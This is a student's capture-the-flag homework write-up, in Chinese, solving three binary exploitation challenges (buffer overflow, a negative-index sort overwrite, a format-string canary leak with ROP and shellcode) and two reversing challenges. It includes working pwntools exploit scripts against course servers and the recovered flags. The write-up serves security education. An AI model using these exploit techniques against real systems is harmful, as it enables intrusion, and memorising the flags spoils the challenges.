hw0
===

## pwn1

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

### concept

objdump 後發現 main 裡面是 gets 讀取輸入，沒有檢查長度所以有 buffer overflow 的漏洞，可以利用漏洞跳到 callme 函數即可拿到 shell

![](https://i.imgur.com/fm7FiID.png)

使用 gdb 測出 ret addr offset 為 40

![](https://i.imgur.com/EDz6A6i.png)

### exploit

```python
#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10120)

addr = 0x0000000000400566

r.sendline('a' * 40 + p64(addr))
r.interactive()
```

### flag

```FLAG{BuFFer_0V3Rflow_is_too_easy}```

## BubbleSort

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### concept

objdump 後讀懂程式邏輯後發現 BubbleSort 中直接將 al 當作 sort 的個數

![](https://i.imgur.com/dZ8zdMd.png)

而原先輸入 sort 個數的值就是存在 eax 中，不過他有判斷 sort 個數不能超過 array 長度，但是可以輸入負數使得 al 的值超過 array 長度，導致 sort 超過 array 範圍，如此即可修改 ret addr 跳到 DarkSoul 函數獲得 shell

![](https://i.imgur.com/GEyVjvP.png)

![](https://i.imgur.com/8T6ikNv.png)

### exploit

將 127 格全部填滿 DarkSoul 的 addr，接著只要 sort 後 ret addr 為 DarkSoul addr 就成功，測試一下發現 -1 就可以了

不直接算 ret addr offset 的原因是因為其中的殘值與 DarkSoul addr 大小關係不確定，不一定直接 sort 127 + offset 的大小就能成功

```python
#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10121)

addr = '0x08048580'

r.recvuntil(':')
r.sendline('127')
r.recvuntil(':')
r.sendline('{} '.format(str(int(addr, 16))) * 127)
r.recvuntil(':')
r.sendline('-1')
r.interactive()
```

### flag

```FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}```

## ret222

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
```

### concept

觀察到該程式保護全開，所以先找一下有沒有 format string 或 heap 相關的漏洞

可以發現在 Show info 輸出 name 的時候有 format string 的漏洞

![](https://i.imgur.com/f7SvZwn.png)

而在 Save data 時使用 `gets` 造成 buffer overflow

所以可以利用 format string leak 出 code base 和 canary，然後再利用 buffer overflow 做出 ROP 讀入 shellcode 到 name 上，最後再跳到 name 上即可 (程式最後結束時會將 name 後的一大塊 memory 權限設成 rwx)

### exploit

```python
#!/usr/bin/env python

from pwn import *

r = process('./ret222')

context.arch = 'amd64'

def setname(data):
    r.sendlineafter('>', '1')
    r.sendafter(':', data)

def showinfo():
    r.sendlineafter('>', '2')
    r.recvuntil(':')

def savedata(data):
    r.sendlineafter('>', '3')
    r.sendlineafter(':', data)

def ex():
    r.sendlineafter('>', '4')

setname("%23$p")
showinfo()
canary = int(r.recvuntil('*')[2:-1], 16)
log.info(hex(canary))

setname("%24$p")
showinfo()
base = int(r.recvuntil('*')[2:-1], 16) - 0xd40
log.info(hex(base))

name = base + 0x202020
main = base + 0xc00
gets = base + 0x908
pop_rdi = base + 0xda3

payload = 'a' * 136 + flat(canary, 'deadbeef', pop_rdi, name, gets, main)
savedata(payload)
ex()

r.sendline(asm(shellcraft.sh()))

payload = 'a' * 136 + flat(canary, 'deadbeef', name)
savedata(payload)
ex()

r.interactive()
```

### flag

```FLAG{YOU_ARE_REALLY_SMART!!!!!!}```

## rev1

### concept

objdump 後發現有一個 print_flag 函數

![](https://i.imgur.com/oxlrRbp.png)

直接使用 gdb 跳過去就會印出 flag 了

![](https://i.imgur.com/0WMcQsp.png)


### flag

```FLAG{_reverse_is_fun}```

## rev2

### concept

使用 IDA 反組譯後可以發現他將輸入每 byte 與 0xcc 做 xor 後和一個特定字串 (unk_4120BC) 比較，若相同輸入即為 flag

![](https://i.imgur.com/tXyz9qb.png)

unk_4120BC 內容

![](https://i.imgur.com/KFouQeu.png)

利用 xor 的特性可知將 unk_4120BC 每 byte xor 0xcc 即可還原出 flag

### exploit

```python
#!/usr/bin/python3

flag = [0x8A, 0x80, 0x8D, 0x8B, 0xB7, 0x94, 0xFC, 0xBE, 0x93, 0xB8, 0xA3,
        0x93, 0x8F, 0xBE, 0xF8, 0xAF, 0xA7, 0x93, 0x81, 0xFF, 0xB1]

for i in flag:
    print(chr(i ^ 0xcc), end='')
```

### flag

```FLAG{X0r_to_Cr4ck_M3}```
